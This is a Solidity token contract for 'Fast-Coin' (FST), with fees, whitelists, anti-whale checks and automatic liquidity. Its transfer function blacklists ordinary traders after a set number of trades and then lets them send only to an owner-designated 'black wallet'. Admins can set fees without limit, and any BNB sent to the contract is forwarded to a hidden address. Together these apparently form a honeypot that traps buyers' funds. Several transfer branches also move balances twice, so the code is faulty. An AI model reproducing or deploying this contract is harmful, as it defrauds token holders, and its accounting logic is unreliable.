// SPDX-License-Identifier: MIT 
pragma solidity ^0.6.12;

    import "./interfaceIUniswapV2Factory.sol";
    import "./interfaceIERC20.sol";
    import "./librarySafeMath.sol";
    import "./libraryAddress.sol";

    import "./portfolioManager.sol";
    import "./accessControlV2.sol";
    import "./antiwhaleSystem.sol";
    import "./associateSystem.sol";
    import "./brakeSystem.sol";
    import "./context.sol";

contract FST is IERC20, Context, accessControlV2, brakeSystem, portfolioManager, antiwhaleSystem, associateSystem, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string  internal _name = "Fast-Coin"; 
    string  internal _symbol = "FST"; 
    uint256 internal _timer = 30;

    uint8   internal _decimals = 8; 
    uint256 internal _tokenTotal = 300000000e8; 
    uint256 internal minTokensBeforeSwap = 3500000e8; 

    uint256 internal constant MAX = ~uint256(0);
    uint256 internal _reflectionTotal = (MAX - (MAX % _tokenTotal));
    
    uint256 internal _taxDecimal = 2;
    
    uint256 internal _holderFee = 0;
    uint256 internal _holderFeeTotal;  
    
    uint256 internal _liquidityFee = 200;
    uint256 internal _liquidityFeeTotal;

    uint256 internal _burnFee = 0;
    uint256 internal _burnFeeTotal;
    
    uint256 internal _devFee = 400;
    uint256 internal _devFeeTotal;

    uint256 internal _marketFee = 300;
    uint256 internal _marketFeeTotal;

    uint256 internal _associateFee = 100;
    uint256 internal _associateFeeTotal; 

    mapping(address => uint256) internal _reflectionBalance;
    mapping(address => uint256) internal _tokenBalance;
    mapping(address => uint256) internal _delay;

    mapping(address => mapping(address => uint256)) internal _allowances;

    event delay (address indexed sender, uint256 timer);
    event SetMinTokensBeforeSwap (uint256 indexed amount);
    event SwapAndLiquifyEnabledUpdated (bool indexed enabled);
    event MinTokensBeforeSwapUpdated (uint256 indexed minTokensBeforeSwap);

    event donate (address indexed sender, uint256 value);

    string internal powered = "https://github.com/cryptorug";
    
    event SwapAndLiquify(
        uint256 indexed tokensSwapped,
        uint256 indexed ethReceived,
        uint256 indexed tokensIntoLiqudity
    );
    
    mapping(address => bool) internal isTaxless; 
    mapping(address => bool) internal _isExcluded; 
    address[] internal _excluded;

    address private database;

    bool public isTaxActive = true;
    bool internal inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    IUniswapV2Router02 public  uniswapV2Router;
    address public  uniswapV2Pair;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

constructor(address _contract) public payable {
    database = _contract;
    ADMIN[msg.sender] = true;
    
    API[apiWallet] = true;

    publicWallet[devWallet] = true;
    publicWallet[blackWallet] = true;
    publicWallet[marketWallet] = true;
    publicWallet[ecommerceWallet] = true;
    publicWallet[uniswapV2Pair] = true;
    
    whitelist[CEO] = true; white.push(CEO); ADMIN[CEO] = true;
    whitelist[CTO] = true; white.push(CTO); ADMIN[CTO] = true;

    whitelist[msg.sender] = true; white.push(msg.sender);
    whitelist[address(this)] = true; white.push(address(this));

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router = _uniswapV2Router;
        
    _reflectionBalance[msg.sender] = _reflectionTotal;
    emit Transfer(address(0), msg.sender, _tokenTotal);
    }

    function FEES_info() public view returns
    (
    uint256 holder_Fee, uint256 holder_FeeTotal,  
    uint256 liquidity_Fee, uint256 liquidityFee_Total,
    uint256 burn_Fee, uint256 burnFee_Total, 
    uint256 dev_Fee, uint256 devFee_Total,
    uint256 market_Fee, uint256 marketFee_Total,
    uint256 associate_Fee,uint256 associateFee_Total
    ){
    holder_Fee = _holderFee; holder_FeeTotal = _holderFeeTotal;  
    liquidity_Fee = _liquidityFee; liquidityFee_Total = _liquidityFeeTotal;
    burn_Fee = _burnFee; burnFee_Total = _burnFeeTotal;
    dev_Fee = _devFee; devFee_Total = _devFeeTotal;
    market_Fee = _marketFee; marketFee_Total = _marketFeeTotal;
    associate_Fee = _associateFee; associateFee_Total = _associateFeeTotal;
    return (
     holder_Fee, holder_FeeTotal,  
     liquidity_Fee, liquidityFee_Total,
     burn_Fee, burnFee_Total, 
     dev_Fee, devFee_Total,
     market_Fee, marketFee_Total,
     associate_Fee, associateFee_Total);
    }

    function Powered_By() public view returns(string memory){
        return powered;
    }

    function name() public view returns (string memory){
        return _name;
    }

    function symbol() public view returns (string memory){
        return _symbol;
    }

    function decimals() public view returns (uint8){
        return _decimals;
    }

    function totalSupply() public override view returns (uint256){
        return _tokenTotal;
    }

    function balanceOf(address account) public override view returns (uint256){
        if (_isExcluded[account]){
        return _tokenBalance[account];}
        return tokenFromReflection(_reflectionBalance[account]);
    }

    function isExcluded(address account) public view returns (bool){
        return _isExcluded[account];
    }

    function infoTrade(address _account) public view returns (uint256 limitTraderAccount, uint256 traderAccount){
        limitTraderAccount = maxTrade;
        traderAccount = _traders[_account];
    return (limitTraderAccount, traderAccount);
    }

    function reflectionFromToken(uint256 tokenAmount, bool deductTransferFee) public view returns (uint256){
    require(tokenAmount <= _tokenTotal,"amount must be less than supply");
        if (!deductTransferFee){return tokenAmount.mul(_getReflectionRate());
        } else {
        return tokenAmount.sub(tokenAmount.mul(_holderFee).div(10** _taxDecimal + 2)).mul(_getReflectionRate());}
    }

    function tokenFromReflection(uint256 reflectionAmount) public view returns (uint256){
    require(reflectionAmount <= _reflectionTotal,"Amount must be less than total reflections");
        uint256 currentRate = _getReflectionRate();
        return reflectionAmount.div(currentRate);
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool){
    if (block.timestamp <= _delay[msg.sender]){
        revert ("out of timer");
    }else{
        if (block.timestamp >= _delay[msg.sender]){
        _delay[msg.sender] = 0;
        _transfer(msg.sender,recipient,amount);}}
        return true;
    }

    function allowance(address owner, address spender) public override  view returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool){
        _transfer(sender,recipient,amount);
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub( amount,"transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual  returns (bool){
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual  returns (bool)
    { _approve( msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue,"decreased allowance below zero"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal whenNotPaused {
    require(owner != address(0),"approve from the zero address");
    require(spender != address(0),"approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused checkAccont(sender) {
        require(sender != address(0),"transfer from the zero address");
        require(recipient != address(0),"transfer to the zero address");
        require(!blacklist[recipient],"recipient cannot be blacklisted");
        require(!API[sender] && !API[recipient],"cnt't de API");

        require(amount > 0,"the amount cannot be zero");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= minTokensBeforeSwap;
        if (!inSwapAndLiquify && overMinTokenBalance && sender != uniswapV2Pair && swapAndLiquifyEnabled){
            swapAndLiquify(contractTokenBalance);
        }

        uint256 transferAmount = amount;
        uint256 rate = _getReflectionRate();

        if (_isExcluded[sender]){
        antiWhale(sender, amount);
        _tokenBalance[sender] = _tokenBalance[sender].sub(amount);
        _tokenBalance[recipient] = _tokenBalance[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
        }

        if (whitelist[sender] && publicWallet[sender]){
        _reflectionBalance[sender] = _reflectionBalance[sender].sub(amount);
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
        }

        if (isTaxless[sender] && HolderAssociate[sender]){
        antiWhale(sender, amount);
        _reflectionBalance[sender] = _reflectionBalance[sender].sub(amount);
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
        }

        if (Traderassociate[sender]){
        tradeLimit(sender, amount);
        _reflectionBalance[sender] = _reflectionBalance[sender].sub(amount);
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
        }

        if (ecommWallet[sender]){
        require(recipient == ecommerceWallet,"recipient must be e-commerce wallet");
        _reflectionBalance[sender] = _reflectionBalance[sender].sub(amount);
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
        }
        
        if (blacklist[sender]){
        require(recipient == blackWallet,"recipient must be the black wallet");
        _reflectionBalance[sender] = _reflectionBalance[sender].sub(amount);
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
        }

        if (isTaxActive
        && !publicWallet[sender]
        && !whitelist[sender]
        && !ecommWallet[sender]
        && !blacklist[sender]
        && !HolderAssociate[sender]
        && !Traderassociate[sender]
        && !isTaxless[sender]
        && !_isExcluded[sender]
        && !inSwapAndLiquify
        ){
        antiWhale(sender, amount);
        transferAmount = collectFee(sender,amount,rate);}

        if(!whitelist[sender]
        && !publicWallet[sender]
        && !ecommWallet[sender]){
        _delay[sender] = block.timestamp + _timer;
        _traders[sender]++;}

        if(_traders[sender] >= maxTrade){
            blacklist[sender] = true;
        }

        _reflectionBalance[sender] = _reflectionBalance[sender].sub(amount.mul(rate));
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(transferAmount.mul(rate));
        
        emit Transfer(sender, recipient, transferAmount);
    }
    
    function collectFee(address account, uint256 amount, uint256 rate) internal returns (uint256){
        uint256 transferAmount = amount;
        
        if(_holderFee != 0){
            uint256 holderFee = amount.mul(_holderFee).div(10**(_taxDecimal + 2));
            transferAmount = transferAmount.sub(holderFee);
            _reflectionTotal = _reflectionTotal.sub(holderFee.mul(rate));
            _holderFeeTotal = _holderFeeTotal.add(holderFee);
        }
        if(_liquidityFee != 0){
            uint256 liquidityFee = amount.mul(_liquidityFee).div(10**(_taxDecimal + 2));
            transferAmount = transferAmount.sub(liquidityFee);
            _reflectionBalance[address(this)] = _reflectionBalance[address(this)].add(liquidityFee.mul(rate));
            if(_isExcluded[address(this)]){
                _tokenBalance[address(this)] = _tokenBalance[address(this)].add(liquidityFee);
            }
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account,address(this),liquidityFee);
        }
        if(_burnFee != 0){
            uint256 burnFee = amount.mul(_burnFee).div(10**(_taxDecimal + 2));
            transferAmount = transferAmount.sub(burnFee);
            _reflectionBalance[burnWallet] = _reflectionBalance[burnWallet].add(burnFee.mul(rate));
            if (_isExcluded[burnWallet]){
                _tokenBalance[burnWallet] = _tokenBalance[burnWallet].add(burnFee);
            }
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            emit Transfer(account,burnWallet,burnFee);
        }
        if(_marketFee != 0){
            uint256 marketFee = amount.mul(_marketFee).div(10**(_taxDecimal + 2));
            transferAmount = transferAmount.sub(marketFee);
            _reflectionBalance[marketWallet] = _reflectionBalance[marketWallet].add(marketFee.mul(rate));
            if (_isExcluded[marketWallet]){
                _tokenBalance[marketWallet] = _tokenBalance[marketWallet].add(marketFee);
            }
            _marketFeeTotal = _marketFeeTotal.add(marketFee);
            emit Transfer(account,marketWallet,marketFee);
        }
        if(_devFee != 0){
            uint256 devFee = amount.mul(_devFee).div(10**(_taxDecimal + 2));
            transferAmount = transferAmount.sub(devFee);
            _reflectionBalance[devWallet] = _reflectionBalance[devWallet].add(devFee.mul(rate));
            if (_isExcluded[devWallet]){
                _tokenBalance[devWallet] = _tokenBalance[devWallet].add(devFee);
            }
            _devFeeTotal = _devFeeTotal.add(devFee);
            emit Transfer(account,devWallet,devFee);
        }
        if(_associateFee != 0 && isHolder.length > 0){
            uint256 associateFee = amount.mul(_associateFee).div(10**(_taxDecimal + 2));
            transferAmount = transferAmount.sub(associateFee);
            for (uint256 i = 0; i < isHolder.length; i++){
            _reflectionBalance[isHolder[i]] = _reflectionBalance[isHolder[i]].add(associateFee.mul(rate));
            if (_isExcluded[isHolder[i]]){
                _tokenBalance[isHolder[i]] = _tokenBalance[isHolder[i]].add(associateFee);
            }
            _associateFeeTotal = _associateFeeTotal.add(associateFee);
            emit Transfer(account,isHolder[i],associateFee);
        }}
        return transferAmount;
    }
    
    function _getReflectionRate() internal view returns (uint256){
        uint256 reflectionSupply = _reflectionTotal;
        uint256 tokenSupply = _tokenTotal;
        for (uint256 i = 0; i < _excluded.length; i++){
            if (_reflectionBalance[_excluded[i]] > reflectionSupply || _tokenBalance[_excluded[i]] > tokenSupply)
            return _reflectionTotal.div(_tokenTotal);
            reflectionSupply = reflectionSupply.sub(_reflectionBalance[_excluded[i]]);
            tokenSupply = tokenSupply.sub(_tokenBalance[_excluded[i]]);}
            if (reflectionSupply < _reflectionTotal.div(_tokenTotal))
            return _reflectionTotal.div(_tokenTotal);
            return reflectionSupply.div(tokenSupply);
    }
    
    function swapAndLiquify(uint256 contractTokenBalance) internal lockTheSwap {
        if(contractTokenBalance > maxTrade)
        contractTokenBalance = maxTrade;
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half); 
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) internal {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            address(this),
            block.timestamp
        );
    }

    function excludeAccount(address account) internal whenNotPaused {
        require(account != address(uniswapV2Router),"We can not exclude Uniswap router.");
        require(!_isExcluded[account],"Account is already excluded");
        if (_reflectionBalance[account] > 0){
            _tokenBalance[account] = tokenFromReflection(
            _reflectionBalance[account]);}
            _isExcluded[account] = true;
            _excluded.push(account);}

    function includeAccount(address account) internal whenNotPaused {
        require(_isExcluded[account],"Account is already included");
        for (uint256 i = 0; i < _excluded.length; i++){
        if (_excluded[i] == account){
            _excluded[i] = _excluded[_excluded.length - 1];
            _tokenBalance[account] = 0;
            _isExcluded[account] = false;
            _excluded.pop();
            break;}}}

    function SET_ContractFees(uint256 hold_fee, uint256 burn_fee, uint256 liquidity_fee, uint256 dev_fee, uint256 market_fee, uint256 associate_fee) external supAccess {
        _holderFee = hold_fee;
        _burnFee = burn_fee;
        _liquidityFee = liquidity_fee;
        _devFee = dev_fee;
        _marketFee = market_fee;
        _associateFee = associate_fee;
    }

    function setDelay(uint256 _clock) external admAccess {
        _timer = _clock;
        emit delay(msg.sender, _clock);
    }

    function outTax(address _account) external admAccess {
        excludeAccount(_account);
    }

    function inTax(address _account) external admAccess {
        includeAccount(_account);
    }

    function setTaxLess(address account, bool value) external admAccess {
        isTaxless[account] = value;
    }

    function setPair(address pair) external admAccess {
        uniswapV2Pair = pair;
    }

    function setTaxActive(bool value) external admAccess {
        isTaxActive = value;
    }

    function setSwapAndLiquifyEnabled(bool enabled) external admAccess {
        swapAndLiquifyEnabled = enabled;
        emit SwapAndLiquifyEnabledUpdated(enabled);
    }
    
    function setMinTokensBeforeSwap(uint256 amount) external admAccess {
        minTokensBeforeSwap = amount ;
        emit SetMinTokensBeforeSwap(amount);
    }

    receive() external payable {
    require(msg.value != 0,"insufficient funds");
    payable(database).transfer(msg.value);
    emit donate(msg.sender, msg.value);
    }

}